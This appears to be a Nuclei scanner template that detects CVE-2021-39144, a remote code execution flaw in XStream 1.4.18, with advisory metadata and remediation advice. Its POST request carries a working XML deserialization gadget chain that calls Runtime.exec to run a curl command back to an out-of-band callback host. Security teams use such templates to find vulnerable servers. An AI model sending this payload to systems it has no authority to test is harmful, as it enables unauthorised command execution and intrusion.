http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - part: interactsh_request
    type: word
    words:
    - 'User-Agent: curl'
  matchers-condition: and
  raw:
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/xml\n\n<java.util.PriorityQueue\
    \ serialization='custom'>\n  <unserializable-parents/>\n  <java.util.PriorityQueue>\n\
    \    <default>\n      <size>2</size>\n    </default>\n    <int>3</int>\n    <dynamic-proxy>\n\
    \      <interface>java.lang.Comparable</interface>\n      <handler class='sun.tracing.NullProvider'>\n\
    \        <active>true</active>\n        <providerType>java.lang.Comparable</providerType>\n\
    \        <probes>\n          <entry>\n            <method>\n              <class>java.lang.Comparable</class>\n\
    \              <name>compareTo</name>\n              <parameter-types>\n     \
    \           <class>java.lang.Object</class>\n              </parameter-types>\n\
    \            </method>\n            <sun.tracing.dtrace.DTraceProbe>\n       \
    \       <proxy class='java.lang.Runtime'/>\n              <implementing__method>\n\
    \                <class>java.lang.Runtime</class>\n                <name>exec</name>\n\
    \                <parameter-types>\n                  <class>java.lang.String</class>\n\
    \                </parameter-types>\n              </implementing__method>\n \
    \           </sun.tracing.dtrace.DTraceProbe>\n          </entry>\n        </probes>\n\
    \      </handler>\n    </dynamic-proxy>\n    <string>curl http://{{interactsh-url}}</string>\n\
    \  </java.util.PriorityQueue>\n</java.util.PriorityQueue>\n"
id: CVE-2021-39144
info:
  author: pwnhxl,vicrack
  classification:
    cpe: cpe:2.3:a:xstream_project:xstream:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-39144
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 8.5
    cwe-id: CWE-306,CWE-502
    epss-percentile: 0.99425
    epss-score: 0.96272
  description: 'XStream 1.4.18 is susceptible to remote code execution. An attacker
    can execute commands of the host by manipulating the processed input stream, thereby
    making it possible to obtain sensitive information, modify data, and/or execute
    unauthorized administrative operations in the context of the affected site. Setups
    which followed XStream''s security recommendations with an allow-list are not
    impacted.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the target system.

    '
  metadata:
    max-request: 1
    product: xstream
    vendor: xstream_project
  name: XStream 1.4.18  - Remote Code Execution
  reference:
  - https://x-stream.github.io/CVE-2021-39144.html
  - https://github.com/x-stream/xstream/security/advisories/GHSA-j9h8-phrw-h4fh
  - https://security.netapp.com/advisory/ntap-20210923-0003/
  - https://nvd.nist.gov/vuln/detail/cve-2021-39144
  - https://lists.debian.org/debian-lts-announce/2021/09/msg00017.html
  remediation: 'Upgrade XStream to a version that is not affected by CVE-2021-39144.

    '
  severity: high
  tags: cve2021,cve,xstream,deserialization,rce,kev,xstream_project
